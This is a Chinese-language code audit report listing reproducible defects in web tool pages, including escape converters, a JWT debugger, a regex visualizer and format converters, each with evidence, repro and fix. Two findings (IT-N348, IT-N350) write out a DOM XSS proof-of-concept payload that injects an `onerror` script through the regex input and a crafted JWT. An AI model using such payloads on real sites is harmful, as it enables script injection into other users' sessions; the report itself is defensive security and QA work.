- 方案：补 `FIGS[6]='8'` 并按 ITA2 标准核对全表（含 code 5 的国别变体）；编码遇网格外字符时显式报错并列出被丢弃字符。

### IT-N335 C 字符串转义把非 ASCII 输出为非法 `\x` 序列并破坏往返（高，确认缺陷）
- 问题：`cp > 0x7E` 一律输出 `\x` + 最少 2 位十六进制，C 的 `\x` 无长度上限且值超出 `unsigned char` 即为非法；反转义又只读 2 位。
- 证据：`tools/it/c-string-escape.html:288`
- 复现：输入 `中`（U+4E2D）→ 实际 `\x4e2d`（C 编译报 hex escape out of range）；对其反转义 → 实际 `N2d`（只取 `4e`=78='N'，余下 `2d` 当普通字符），期望 `中`；输入 emoji → `\x1f600`（5 位，同样越界）。
- 影响：生成的 C 源码不可编译；复制后再反转义不可逆，中文/emoji 全部损坏。
- 方案：`cp > 0xFF` 用 `\uXXXX`/`\UXXXXXXXX`（C99 通用字符名）或保留 UTF-8 原字符；反转义补 `\u`（4 位）/`\U`（8 位）；加 CJK、emoji 往返用例。

### IT-N336 C 字符串反转义的八进制分支永不匹配（高，确认缺陷）
- 问题：`switch(n)` 的 `case /[0-7]/:` 是正则对象，与字符串严格比较恒为 false，八进制转义全部落入 `default`。
- 证据：`tools/it/c-string-escape.html:330-334`
- 复现：`\101` → 实际 `101`，期望 `A`（0o101=65）；`\012` → 实际 NUL + `12`（另有 `case '0'` 只吃 2 字符），期望换行 `\n`。
- 影响：C 源码中合法的八进制转义全部解错，且无提示。
- 方案：改 `case '0': … case '7':` 或前置 `if(/[0-7]/.test(n))`，按 C 规则最多读 3 位八进制。

### IT-N337 Go/PHP/Python 三页同型八进制反转义失效（历史记录；Go 源码已变，待分别回归）

> 2026-11-06 续审：`tools/it/go-escape.html:349-354` 当前显式处理 `case '0'` 至 `case '7'`，旧版 `case /[0-7]/` 已不在 Go 页；PHP/Python 本批未复核，不能据此销账。
- 问题：三页 `unescape/unesc` 均把八进制分支写成 `case /[0-7]/:`，正则与字符串严格比较恒 false，`\101` 落入 `default` 原样输出。
- 证据：`tools/it/go-escape.html:339`、`tools/it/php-escape.html:345`、`tools/it/python-escape.html:363`
- 复现：三页输入 `\101` → 实际均为 `101`，期望 `A`；PHP/Python 的 `\0` 也会被拆成字面 `0`。
- 影响：三种语言官方支持的 C 风格八进制转义（如 `\101`、`\0`）在反转义时全部失效，且无提示。
- 方案：改为字符窗口判断（`case '0'`…`case '7'` 或 `if(/[0-7]/.test(n))`），最多 3 位；三页共用同一份实现并加固定用例。

### IT-N338 Rust 字节串模式对非 ASCII 输出非法 `\u{}`（高，确认缺陷）
- 问题：`kind==='byte'` 且 `cp > 0xFF` 时输出 `\u{...}`，Rust 字节串字面量不支持 `\u` 转义（仅 `\xNN`），生成代码不可编译。
- 证据：`tools/it/rust-escape.html:299-301`
- 复现：kind=byte，输入 `中` → 实际 `b"\u{4e2d}"`；期望 `b"\xe4\xb8\xad"`（UTF-8 三字节）或明确拒绝该组合。
- 影响：宣称支持的「字节串」转义产出非法 Rust 代码；用户复制即编译失败。
- 方案：byte 模式用 `TextEncoder` 取 UTF-8 字节后逐字节 `\xNN`；对无法表示的码点给错提示。

### IT-N339 HTML 全转义只输出 emoji 的高位代理（高，确认缺陷）
- 问题：`escAll` 分支用 `charCodeAt(0)` 取单个 UTF-16 单元，`Array.from` 的 emoji 是双单元码点，低位代理被丢弃。
- 证据：`tools/it/html-escape.html:450`（name）、`:461`（dec）、`:470`（hex）
- 复现：勾选「转义全部非 ASCII」+ 输入 `😀`（U+1F600）→ 实际 `&#55357;`（仅 0xD83D）；期望 `&#128512;`（dec）或代理对两个实体。再反转义得到孤立代理，浏览器显示乱码。
- 影响：emoji 与 CJK 扩展 B 区字符转义后不可逆，复制到 HTML 中显示错误。
- 方案：用 `codePointAt(0)` 输出码点（dec/hex）；`html-name` 对 `cp > 0xFFFF` 同样走数字实体，代理对场景补用例。

### IT-N340 HTML/JS 反转义顺序错误，`\\` 开头的序列被错解（高，确认缺陷）
- 问题：`doUnescape('js')` 用固定顺序链式 `replace`，`\\n`/`\\uXXXX`/`\\0` 在 `\\\\` 之前被替换，把「转义反斜杠」当成真实转义。
- 证据：`tools/it/html-escape.html:518-527`
- 复现：输入 `C:\\new`（JS 字面量，原意 `C:\new`）→ 实际 `C:\` + 换行 + `ew`，期望 `C:\new`；`\\u0041` → 实际 `A`，期望字面 `\u0041`；`\\0` → 实际 NUL。
- 影响：Windows 路径、正则字面量等含反斜杠的字符串反转义后内容被改写。
- 方案：改为单遍状态机：遇 `\` 先看下一个字符，`\\` 优先成对消费，与 `tools/it/js-escape.html` 的 `unesc` switch 实现对齐。

### IT-N341 text-to-hex「\x 前缀」选项值多一个反斜杠，输出格式错误（高，确认缺陷）
- 问题：HTML 属性 `value="\\x"` 实际得到 3 个字符（`\`、`\`、`x`），而 JS 比较的是 2 字符字面量 `'\\x'`，恒不相等，走分隔符分支。
- 证据：`tools/it/text-to-hex.html:207`、`:449`、`:459`
- 复现：分隔符选「\x 前缀」，输入 `Hi` → 实际 `48\\x69`（字节间插入两个反斜杠 + x），期望 `\x48\x69`。
- 影响：选择该格式后产出无法被 C/JS 源码消费的字符串，且与同页「0x 前缀」表现不一致。
- 方案：选项值改为单反斜杠（`value="\x"`，1 字符），或改用 `sep === '\\x' || sep === '\\\\x'` 兼容判断；补该选项固定用例。

### IT-N342 text-to-octal「\ 前缀」选项同类缺陷（高，确认缺陷）
- 问题：选项 `value="\\"` 是 2 个字符，JS 比较 `sep === '\\'`（1 个字符）恒 false，前缀未加上，反而把两个反斜杠当分隔符插入。
- 证据：`tools/it/text-to-octal.html:204`、`:438`、`:443`
- 复现：分隔符选「\ 前缀」，输入 `Hi` → 实际 `110\\145`，期望 `\110\145`（C 八进制转义）。
- 影响：生成的八进制转义串非法；与同页「0 前缀」行为不一致。
- 方案：选项值改为单个反斜杠，或按 `sep.length` / `startsWith` 判断；补用例。

### IT-N343 json-to-tsv「自动识别数字」默认开启，长 ID/前导零被改写（高，确认缺陷）
- 问题：`t2jNumber` 默认勾选，直接用 `parseFloat` 转数值再 `JSON.stringify`；超出 IEEE-754 安全整数的值被舍入，前导零字符串变数字。
- 证据：`tools/it/json-to-tsv.html:282`（默认 `checked`）、`:588-589`
- 复现：TSV 输入 `id\n12345678901234567890` → 实际 JSON `"id":12345678901234567000`；`00123` → `123`；期望保持字符串原值。
- 影响：默认配置下订单号、身份证、手机号、带前导零的编码被静默改坏，复制出去即数据事故。
- 方案：仅当 `Number.isSafeInteger(Number(val))` 且匹配 `/^-?(0|[1-9]\d*)(\.\d+)?$/`（无前导零、无千分位）时才转数字；或默认关闭并提示风险。

### IT-N344 uuencode 反转义强制要求 `begin` 头，合法数据静默输出空（中，确认缺陷）
- 问题：`decodeUu` 以 `started=false` 起步，只有匹配到 `begin <权限> <文件名>` 才置真，否则所有数据行都被跳过，且无报错。
- 证据：`tools/it/uuencode.html:276-277`
- 复现：粘贴仅含数据行 + `end` 的 uuencode 编码（RFC 未强制头行）→ 实际输出空字符串、无提示；期望按数据行解析或明确报错「缺少 begin 头」。
- 影响：从邮件/工具中截取的纯数据段无法解码，用户误以为内容损坏。
- 方案：未找到 `begin` 行时按首字符长度解析（与 `xxencode` 页行为一致），或 alert 说明缺失头行。

### IT-N345 xor-cipher 十六进制输入不校验，非法/奇数长度静默变 0 或截断（中，确认缺陷）
- 问题：`parseInput('hex')` 不校验字符集与长度，`new Uint8Array(s.length/2)` 对奇数长度截断，`parseInt(...,16)` 非法时得 NaN 写入类型数组变 0。
- 证据：`tools/it/xor-cipher.html:270-274`
- 复现：inFmt=hex，输入 `zz` → 实际按 0x00 参与异或（输出为密钥字节本身）；输入 `1`（奇数）→ 实际长度 0、输出空；期望拒绝并提示非法/奇数十六进制。
- 影响：用户粘贴含空格/前缀/大小写混杂的十六进制时得到看似正常但错误的密文。
- 方案：去空白后校验 `/^[0-9a-fA-F]*$/` 且长度为偶数（允许 `0x`/`\x` 前缀剥离），否则 alert。

### IT-N346 polybius-cipher 编码静默丢弃 5×5 网格外字符（中，确认缺陷）
- 问题：`findInGrid` 返回 -1 时直接 `continue`，数字、标点、非拉丁字符全部消失且无提示。
- 证据：`tools/it/polybius-cipher.html:321`
- 复现：输入 `AB1` → 实际 `1112`（"1" 被丢弃），再解码回 `AB`；期望保留标记或明确拒绝不可编码字符。
- 影响：含数字/标点的明文加密后信息丢失，往返不一致。
- 方案：统计并提示不可编码字符（alert/状态行），或提供含数字的 6×6 网格选项。

### IT-N347 xxencode 未勾选「包含 begin/end 头」时把 header 行当数据行解码（中，确认缺陷）
- 问题：`started = !withHeader.checked`，默认未勾选即视为纯数据；粘贴含 `begin 644 file.txt` 的标准全文时，该行首字符 `b` 命中字母表（长度=38），被当数据行解码。
- 证据：`tools/it/xxencode.html:277`、`:289`
- 复现：默认状态粘贴含 `begin 644 file.txt` 的完整 xxencode 文本 → 实际输出前几字节乱码（header 被部分解码），无提示；期望无条件识别并跳过 `begin` 行。
- 影响：解码外部 xxencode 文件时静默产生脏数据。
- 方案：解码前无条件匹配 `^begin\s+\d+\s+\S*` 并跳过；勾选项仅控制是否解析尾部 `+`/`end`。

## T 批 IT 第 2 轮覆盖（2026-11-04）
- 本轮审计 24 页：`binary-encode`、`baudot-code`、`c-string-escape`、`xxencode`、`uuencode`、`quoted-printable`、`html-entity-encoder`、`html-escape`、`js-escape`、`java-escape`、`go-escape`、`php-escape`、`rust-escape`、`sql-escape`、`css-escape`、`python-escape`、`text-to-binary`、`text-to-decimal`、`text-to-hex`、`text-to-octal`、`rot-cipher`、`xor-cipher`、`polybius-cipher`、`json-to-tsv`（均为 `tools/it/<slug>.html`）。
- 新增 14 条（高 10 / 中 4），编号 IT-N334~IT-N347；第 1 轮止于 IT-N333，本批无重号。
- 假工具候选 0 页（24 页均有真实编码/转义/转换逻辑，未发现纯回显或静态壳）。
- 无高优、仅记录覆盖的页面：`binary-encode`、`quoted-printable`、`html-entity-encoder`、`js-escape`、`java-escape`、`sql-escape`、`css-escape`、`text-to-binary`、`text-to-decimal`、`rot-cipher`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：C/Go/PHP/Python 转义、HTML 实体、CSS 跳过、hex/octal 前缀拼接、hex 解析均用 `node` 复刻原函数实算（`\101`→`101`、`\x4e2d`→`N2d`、`&#55357;`、`48\\x69`、`110\\145`、`parseFloat("12345678901234567890")=12345678901234567000`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

## T 批 IT 第 3 轮覆盖（2026-11-04）
- 本轮审计 8 页（均为 `tools/it/<slug>.html`）：`regex-visualizer`、`jwt-debugger`、`hash-identifier`、`json-repair`、`json-to-xml`、`yaml-to-xml`、`csv-to-yaml`、`toml-to-yaml`。
- 新增 18 条（高 8 / 中 10），编号 IT-N348~IT-N365；第 2 轮止于 IT-N347，本批无重号。
- 假工具候选 0 页：8 页均有真实转换/解析逻辑（JWT 生成器例外，见 IT-N349）。

### IT-N348 正则表达式原样拼进 innerHTML，可执行任意脚本（高，确认缺陷）
- 问题：`render()` 把 token 直接插入状态标签与边标签的 innerHTML，未做 HTML 转义；而正则里 `<`、`>`、`=`、`/` 都是合法字面量，第 272 行的 `new RegExp` 校验不会拦截这类载荷。
- 证据：`tools/it/regex-visualizer.html:283`、`:285`（切分逻辑 `:236-248`，输入框 `:133`）
- 复现：输入 `<img src=x onerror=alert(1)>` → `new RegExp` 通过（node 实测为合法正则），结果区 `<div class="state">S1: <img src=x onerror=alert(1)>` 注入并弹窗；期望按纯文本显示每个 token。
- 影响：DOM XSS；该输入还会被解析历史/预设恢复路径回填（`:300-399`），刷新后点历史即可再次触发。
- 方案：状态与边的标签统一走 `escH()` 或 `textContent`/`createTextNode` 渲染，禁止字符串拼接进 innerHTML。

### IT-N349 「生成 JWT」用 32 位滚动哈希冒充 HMAC，产出 token 无法验签（高，确认缺陷）
- 问题：`simpleHmac()` 只是 `hash=((hash<<5)-hash)+chr` 的 32 位滚动哈希，返回十进制字符串，再对该字符串做 base64url；既不是 HMAC-SHA256/384/512，也不是签名字节的 base64url。
- 证据：`tools/it/jwt-debugger.html:490-499`、`:479`（`base64UrlEncode(simpleHmac(sigInput, secret))`）
- 复现：alg=HS256、secret=`your-secret-key`、payload=`{"sub":"123"}` → 实际第三段是 `"123456789"` 之类十进制串的 base64url；用 node `crypto` 按 HS256 复算得到完全不同的签名，任何 JWT 库/服务端验签必失败；期望输出可通过标准验签的签名。
- 影响：页面标题承诺「生成JWT」，但生成的 token 100% 无效，接入联调必得 401，属假实现。
- 方案：改用 WebCrypto（`crypto.subtle.importKey('raw',…,{name:'HMAC',hash:'SHA-256'})` + `subtle.sign`），按 alg 映射 SHA-256/384/512，签名 ArrayBuffer 直接 base64url。

### IT-N350 声明表把 payload 键/值原样写进 innerHTML，他人 token 可执行脚本（高，确认缺陷）
- 问题：`for (const [k,v] of Object.entries(payload))` 用模板串把 `k`、`displayVal` 直接拼进 `claimsHtml`，最后 `claimsDiv.innerHTML=claimsHtml`；payload 完全来自粘贴 token 的解码结果。
- 证据：`tools/it/jwt-debugger.html:446-454`（拼接在 `:451`）
- 复现：构造三段合法 base64url 的 token，payload 为 `{"name":"<img src=x onerror=alert(1)>"}` → 声明表渲染即执行（node 复算确认 claimsHtml 含未转义的 `<img`）；期望显示为文本。
- 影响：可把恶意 token 发给他人，在本站执行脚本并读取 localStorage 中的解析历史（历史里存着其它 token 前缀）。
- 方案：`k`/`displayVal` 一律转义（或逐单元格 `textContent`），时间字段单独格式化后再插入。

### IT-N351 解析历史只存前 60 字符，点击任一历史项必然解析失败（高，确认缺陷）
- 问题：`addToHistory(token.substring(0, 60) + '...')` 只保存截断串；`loadHist` 却把它当完整 token 回填给 `decodeJwt()`。
- 证据：`tools/it/jwt-debugger.html:457`（写入）、`:519-524`、`:533-539`（读取）
- 复现：解析任意长度 > 60 的真实 token → 历史项显示前 60 字；点击该项 → 输入框得到 `…<截断>….eyJ…...`，`token.split('.')` 段数 ≥ 4 → 恒显示「❌ JWT格式错误：应该包含3个用点分隔的部分」；期望恢复完整 token 并正常解析。
- 影响：解析历史功能整体不可用，且原始 token 从未落库，无法从历史找回。
- 方案：历史存完整 token，仅在渲染时 `substring(0,60)+'…'` 展示；或只存 header/payload 解析结果。

### IT-N352 修复前无条件删注释（不区分字符串内外），合法 JSON 被静默改值（高，确认缺陷）
- 问题：`repair()` 先用 `/\/\*[\s\S]*?\*\//g`、`/\/\/[^\n]*/g` 全局删注释，再改单引号与尾逗号；没有字符串状态机，字符串里的 `//`、`/* */` 一并被删。
- 证据：`tools/it/json-repair.html:215-222`（`:216-217` 为两条注释正则，`:225` 为 JSON.parse 校验）
- 复现（node 复刻原函数）：`{"a":"P/*x*/Q"}` → 实际 `{"a":"PQ"}` 且报「✅ JSON 合法」（静默改值）；`{"url":"https://example.com/api"}` → 实际 `{"url":"https:`，报解析失败；期望合法 JSON 原样通过、非法文本才修复。
- 影响：URL、正则、路径、含 `//` 的文案被静默截断或改值，页面仍打「合法」绿标，复制出去即数据事故。
- 方案：先试 `JSON.parse(raw)`，成功即原样返回；确需修复时用单遍状态机（跟踪 `inString`/`escape`），只删除字符串外的注释。

### IT-N353 文档与示例承诺补全无引号键，代码无此规则（中，确认缺陷）
- 问题：工具说明表与深度解析示例都写「键无引号 → 补双引号」（`{a:1,}`→`{"a":1}`），但 `repair()` 里只有针对单引号键/值的四条规则，没有任何裸键规则。
- 证据：`tools/it/json-repair.html:174`（表格第 4 行）、`:367`（示例）、`:218-220`（只有单引号规则）
- 复现：输入 `{a:1,}` → 实际 `{a:1}`（只去掉尾逗号），仍报「⚠️ 仍无法解析」；期望 `{"a":1}`。
- 影响：页面自带示例无法通过，用户按说明操作得到失败提示。
- 方案：补 `([{,]\s*)([A-Za-z_$][\w$]*)(\s*:)` → `$1"$2"$3`（需避开字符串内），或删除文档中的该承诺。

### IT-N354 文档承诺的 `#text` 键被注释规则吞掉，元素文本永远无法输出（高，确认缺陷）
- 问题：`parseYaml()` 把所有 `trim()` 后以 `#` 开头的行当注释 `continue`，而 `jsonToXml()` 里实现 `#text` 分支的前提是它能进 items——两者冲突，`#text` 永远读不到。
- 证据：`tools/it/yaml-to-xml.html:230`（`if(!s||s[0]==='#') continue;`）、`:174`（说明「#text 键转为元素文本」）、`:363`（`else if(k==='#text')`）
- 复现（node 复刻）：输入 `note:\n  @id: 1\n  #text: hi` → 实际 `<note id="1"></note>`（文本丢失）；期望 `<note id="1">hi</note>`。
- 影响：文档约定的「属性 + 文本」混排写法完全不可用，文本静默丢失。
- 方案：仅在 `#` 后不是 `text`/`text:` 时才按注释跳过（或用 `$text` 约定并同步说明）。

### IT-N355 顶层为序列/标量时输出非法标签或空 root（中，确认缺陷）
- 问题：`jsonToXml()` 用 `Object.keys(obj)` 生成元素名，顶层数组的键是 `"0"`、`"1"`（数字开头，非法 XML 名）；顶层标量在 `yBlock` 里无冒号被丢弃，得到 `{}`。
- 证据：`tools/it/yaml-to-xml.html:371-373`、`:248-256`（无 `kv` 时 `p.i++; continue;`）
- 复现（node 复刻）：`- a\n- b` → 实际 `<root><0>a</0><1>b</1></root>`（XML 解析器直接报错）；`just a string` → 实际 `<root></root>`（内容丢失）；期望 `<root><item>a</item><item>b</item></root>` 与 `<root>just a string</root>`。
- 影响：合法的 YAML 序列/标量根得到非法 XML 或空文档，下游解析必失败。
- 方案：顶层非映射时用固定元素名（`item` / `value`）包装，并对所有元素名做 `^[A-Za-z_][\w.-]*$` 校验与改写。

### IT-N356 行内注释被并入值、裸 URL 被误判为映射（中，确认缺陷）
- 问题：只过滤整行注释，值里的 ` #` 不截断；`- ` 项用 `yIsMapEntry` 以「含冒号且首字符为字母」判映射，`http://x` 因此被拆成键 `http`。
- 证据：`tools/it/yaml-to-xml.html:226`（`yIsMapEntry`）、`:230`、`:242-243`
- 复现（node 复刻）：`name: Bob # 注释` → 实际 `<name>Bob # 注释</name>`（期望 `Bob`）；`items:\n  - http://x` → 实际 `<items><http>//x</http></items>`（期望 `<items>http://x</items>`）。
- 影响：常见 YAML 写法被静默改成错误值/结构。
- 方案：取标量值时按引号状态截断 ` #` 之后内容；`- ` 项改用「`键: ` 且键名不含 `/`」的严格匹配，其余按标量。

### IT-N357 缩进与「按键名排序」两个控件是死输入（中，确认缺陷）
- 问题：`calcTool()` 全文从未读取 `#indent` 或 `#top_1`（只在 `resetForm`/预设里赋值），输出恒为无缩进的紧凑 XML，排序也不生效；预设却宣称「按键名排序输出」。
- 证据：`tools/it/yaml-to-xml.html:127`、`:131`（控件）、`:216-381`（calcTool 无读取）、`:486-489`（预设与标签）
- 复现：选「4 空格」并勾选「按键名排序输出」→ 实际输出与默认完全相同（`<note><to>Tony</to>…` 单行、键序未变）；期望按 4 空格缩进且键名升序。
- 影响：两个可见控件完全无效，用户以为已生效。
- 方案：给 `jsonToXml` 增加 `indent` 与 `sortKeys` 参数并在 `calcTool` 里读取两个控件的值。

### IT-N358 多行 TOML 数组被解析成空数组，依赖列表静默丢失（高，确认缺陷）
- 问题：`tVal()` 只处理单行 `[...]`：`s.slice(1, s.lastIndexOf(']'))`，行内无 `]` 时 `lastIndexOf` 返回 -1，`inner` 为空直接 `return []`；后续元素行因无 `=` 被 `parseToml` 跳过。
- 证据：`tools/it/toml-to-yaml.html:235`、`:264-265`
- 复现（node 复刻）：`dependencies = [\n  "serde",\n  "tokio",\n]` → 实际 `dependencies:`（空数组，YAML 侧等价 null）；期望 `dependencies:\n  - serde\n  - tokio`。
- 影响：Cargo.toml / pyproject.toml 的多行依赖数组被清空，转出的 YAML 丢数据且无任何提示。
- 方案：值以 `[` 开头且当前行无闭合 `]` 时，继续吞并后续行直到出现 `]`，再统一按顶层逗号切分。

### IT-N359 双反斜杠未先还原，`C:\temp` 被改成 `C:\` + 制表符（中，确认缺陷）
- 问题：`tVal()` 依次 `replace(/\\n/→换行)`、`/\\t/→制表符`、`/\\"/→引号`，未先处理 `\\`；字符串中第 2 个反斜杠紧跟 `n`/`t` 时被当成转义序列。
- 证据：`tools/it/toml-to-yaml.html:230`
- 复现（node 复刻）：`path = "C:\\temp"` → 实际值 `C:\` + TAB + `emp`（YAML 输出同样错值）；期望 `C:\temp`。
- 影响：Windows 路径、正则、含 `\n` 字面量的配置被静默改坏。
- 方案：用单次 `/\\(.)/g` 映射（`n`→换行、`t`→制表符、`"`→引号、`\`→反斜杠），或先把 `\\` 换成占位符最后还原。

### IT-N360 `[[数组表]]` 下的子表、内联表数据静默丢失（中，确认缺陷）
- 问题：`[pkg.meta]` 分支把最后一段直接挂到 `root.pkg`，而 `pkg` 已是数组，命名属性不进 `Object.keys`/`dumpYaml`，子表整体丢弃；`{a=1}` 内联表被 `tVal` 当普通字符串。
- 证据：`tools/it/toml-to-yaml.html:257-260`、`:235`、`:357-379`
- 复现（node 复刻）：`[[pkg]]\nname="a"\n[pkg.meta]\nx=1` → 实际 `pkg:\n  - name: a`（`meta` 消失）；`arr = [{a=1}]` → 实际 `arr:\n  - "{a=1}"`；期望 `- name: a\n    meta:\n      x: 1` 与映射数组。
- 影响：数组表下的子表/内联表被静默丢成空，配置迁移后语义缺失。
- 方案：表头路径最后一段命中已有数组时取「数组末元素」为当前表；`{` 开头的值按内联表递归解析。

### IT-N361 四个预设的「含表头/无表头」全部与实际模式相反（高，确认缺陷）
- 问题：预设用 `top_1: "1"/"0"/""` 表达有/无表头，但 tool-kit 对 checkbox 执行 `f.checked = !!val`——`"0"` 与 `"1"` 都为真。
- 证据：`tools/it/csv-to-yaml.html:345-348`（预设）、`/js/tool-kit.js:993`（`f.checked = !!val`）
- 复现：点「含表头」→ 实际勾上「无表头」，输出 `- ["name","age"]` 纯数组；点「无表头」→ 实际不勾选，把首行当键名（`- Alice: "30"`）；点「默认参数」(`top_1:"0"`) 也会勾选；期望与标签一致。
- 影响：用户按预设一键转换即得到与名称相反的结构，得到的 YAML 语义完全不同。
- 方案：预设值改布尔 `true/false`（并让 `setValue` 识别 `"0"`/`"false"`），同时把「含表头/无表头」的取值方向改对。

### IT-N362 引号内换行被拆成两条记录；表头键不加引号生成非法 YAML（中，确认缺陷）
- 问题：先按 `\n` 切行再逐行 `splitCsv`，引号内的换行失效（与「按 RFC 4180 处理换行」的说明相反）；表头键原样拼接，含 `:`/`#` 时不加引号。
- 证据：`tools/it/csv-to-yaml.html:218`（先切行）、`:219-228`、`:237`（`h+': '+…`）、`:162`（说明）
- 复现（node 复刻）：`name,note\nAlice,"line1\nline2"` → 实际拆成 `['Alice','line1']` 与 `['line2"']` 两条记录（字段错位）；表头 `a:b,c` → 实际 `- a:b: "1"`（YAML 解析成键 `a`、值 `b: 1`）；期望整段换行作为一个字段、键按需加引号。
- 影响：含换行字段的 CSV 全部错行，特殊表头产出非法 YAML。
- 方案：改成字符级流式扫描（同一状态机同时处理 `"`、`,`、`\n`）；键用 `JSON.stringify(head)` 或按 YAML 规则加引号。

### IT-N363 「默认参数」预设的哈希被截成 40 位，一点即误判为 SHA-1（中，确认缺陷）
- 问题：预设 `h` 值只写了完整 SHA-256 的前 40 个十六进制字符，长度恰好落进 40 → SHA-1 映射；同页 `resetForm` 用的却是完整 64 位，两处不一致。
- 证据：`tools/it/hash-identifier.html:336`（预设）、`:234`（重置）、`:223-225`（长度映射）
- 复现（node 复刻）：点「默认参数」→ 输入 `5e884898da28047151d0e56f8dc6292773603d0d`（40 位）→ 实际输出「SHA-1 160 位」；期望「SHA-256 256 位」。
- 影响：首屏默认预设直接给出错误的算法结论。
- 方案：预设值补全为 `…6aabbdd62a11ef721d1542d8`（64 位），与 `resetForm` 保持一致。

### IT-N364 CRC32 长度映射错位（12 位/8 位），`$6$` 承诺未实现（中，确认缺陷）
- 问题：长度表把 12 位十六进制映射为「CRC32 / 短校验」（CRC32 摘要实为 8 位十六进制），真正的 8 位输入判「未知」；公式区与引据表承诺 `$6$` → SHA-512-crypt，代码只识别 `$2a$/$2y$/$2b$/$1$/$argon2`。
- 证据：`tools/it/hash-identifier.html:224`（长度表）、`:220-222`（前缀规则）、`:109`、`:151`（`$6$` 说明）
- 复现（node 复刻）：`1a2b3c4d`（8 位）→ 实际「未知 无法仅凭该值判定」；`1a2b3c4d5e6f`（12 位）→ 实际「CRC32 / 短校验 32 位十六进制（12 位十六进制）」；`$6$rounds=5000$abc$xyz` → 实际「未知」；期望 8 位命中 CRC32、`$6$` 命中 SHA-512-crypt。
- 影响：两类常见摘要被漏判/误判，识别结论错误。
- 方案：长度表改为 `8: CRC32`（删 12 位）；补 `$5$`(SHA-256-crypt)、`$6$`(SHA-512-crypt) 前缀规则，或删掉文档里的对应承诺。

### IT-N365 根为数组时输出多个并列根元素，产物不是合法 XML（中，确认缺陷）
- 问题：`toXml()` 对数组按同一标签逐项输出，根级数组直接得到多个并列根元素；XML 只允许单一根，且页面无任何提示。
- 证据：`tools/it/json-to-xml.html:269-272`（数组分支）、`:288`（`decl + toXml(data, root, …)`）
- 复现（node 复刻）：输入 `[1,2]`、根节点 `root` → 实际 `<?xml …?>\n<root>1</root>\n<root>2</root>`（任何解析器报「junk after document element」）；期望 `<root><item>1</item><item>2</item></root>`。
- 影响：合法 JSON 数组转出的 XML 下游必然解析失败。
- 方案：`depth === 0` 且值为数组时先包一层 `<root>`（或 `<list>`），元素名用 `item`，再逐项输出。

### 覆盖清单（T 批 IT 第 3 轮）
- `regex-visualizer`：IT-N348（高）。
- `jwt-debugger`：IT-N349、IT-N350、IT-N351（高）。
- `hash-identifier`：IT-N363、IT-N364（中）。
- `json-repair`：IT-N352（高）、IT-N353（中）。
- `json-to-xml`：IT-N365（中）。
- `yaml-to-xml`：IT-N354（高）、IT-N355、IT-N356、IT-N357（中）。
- `csv-to-yaml`：IT-N361（高）、IT-N362（中）。
- `toml-to-yaml`：IT-N358（高）、IT-N359、IT-N360（中）。
- 方法声明：以上结论仅基于源码通读 + `node` 复刻页面原函数实算（json-repair / hash-identifier / yaml-to-xml / toml-to-yaml / csv-to-yaml / json-to-xml 的判定均给出「输入 → 实际 / 期望」），未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证；未修改任何工具页或构建产物。

## T 批 IT 第 4 轮覆盖（2026-11-04）

### IT-N366 长文本比较在每次按键都重建两张全尺寸 DP 矩阵，8000 字符即约 1.6GB（高，确认缺陷）
- 问题：`autoCalc()` 绑定在 `oninput`，每次输入都跑 `levenshtein()` 与 `computeDiff()`，两者各自分配 `(m+1)×(n+1)` 的二维数组，且 `levResult.matrix` 在 `computeDiff` 建表期间仍被持有。输入框无 `maxlength`、代码也无长度上限。
- 证据：`tools/it/text-similarity.html:189`、`:194`（`oninput="autoCalc()"`）、`:430-431`、`:497-517`（Levenshtein 全矩阵）、`:556-568`（LCS 全矩阵）、`:656`、`:725`
- 复现（node 复刻）：A/B 各 8000 字符 → 矩阵 64,016,001 格，单次 Levenshtein 810ms、峰值内存 819,633,824 B（约 782MB）；页面同时还要再建一张同规模 LCS 表，峰值约 1.5–1.6GB，且每个按键都重跑一遍；期望：对超过阈值（如 2000 字符）的输入提示「文本过长」并停止自动计算，或改用双行滚动 DP + Myers diff。
- 影响：粘贴两段长文本（代码 diff 是本工具典型用法）后逐字输入即长时间卡死；移动端/低内存设备直接 OOM 崩溃，结果区永远算不完。
- 方案：`levenshtein` 只保留两行滚动数组（回溯改为 ops 栈），`computeDiff` 用线性空间 Myers；同时在 `autoCalc` 前对 `max(lenA,lenB)` 设阈值（超限提示「文本过长」并停止计算），`oninput` 改防抖。

### IT-N367 「比较模式」是死输入，两个选项输出完全相同（中，确认缺陷）
- 问题：`calculate()` 读出 `compareMode` 后从未使用；差异高亮无条件按 LCS 全量渲染，与「完整文本比较 / 逐字符比较（差异高亮）」选项无关。
- 证据：`tools/it/text-similarity.html:176-181`（控件）、`:639`（只赋值）、`:724-727`（无条件渲染）、`:902-905`（预设还专门为它写值）
- 复现：同一对文本下切换「完整文本比较」与「逐字符比较（差异高亮）」→ 实际结果区、差异高亮、综合评分逐字节相同；期望：逐字符模式应只做等长位置对比（或至少改变高亮粒度），否则该控件应删除。
- 影响：可见控件完全无效，用户以为切换了比较口径，实际评分口径没变。
- 方案：把 `compareMode` 传入 `calculate()`：`full` 用 LCS diff，`char` 用等长逐位 diff（长度不等时按位截断并提示），或移除该控件与预设字段。

### IT-N368 非法罗马串被静默转成数字，`ABC → 100`、`IL → 49`、`MMMM → 4000`（中，确认缺陷）
- 问题：`fromRoman()` 先 `replace(/[^IVXLCDM]/g,'')` 剔除所有非法字符，再按「右到左、小减大加」累加；既不校验剩余串是否符合减法/重复规则，也不校验结果是否落在 1–3999。页面自己的公式区还写明「不能出现 IL 或 IC」「标准范围 1~3999」。
- 证据：`tools/it/roman-numeral-converter.html:101`（字符集/范围说明）、`:156`（IL/IC 非法）、`:216`（`fromRoman`）、`:223-225`（非空即直接输出结果）
- 复现（node 复刻）：`ABC` → 实际 `ABC → 100`（A/B 被剔除，剩 C）；`XYZ` → 10；`IL` → 49、`IC` → 99、`IIII` → 4、`VV` → 10（均属非法写法）；`MMMM` → 4000（超出 1–3999）；期望：这些输入全部提示「非法罗马数字」而不是给出数字。
- 影响：乱码/拼写错误被算成貌似合法的数值，用户无法察觉；超出范围的 4000 与页面声明的范围矛盾。
- 方案：剔除后先做完整校验：正则 `^M{0,3}(CM|CD|D?C{0,3})(XC|XL|L?X{0,3})(IX|IV|V?I{0,3})$`，并要求 `1 ≤ value ≤ 3999`，不通过则输出错误提示。

### IT-N369 页面承诺「输入即可立即互转」，实际必须点「计算」才刷新（中，确认缺陷）
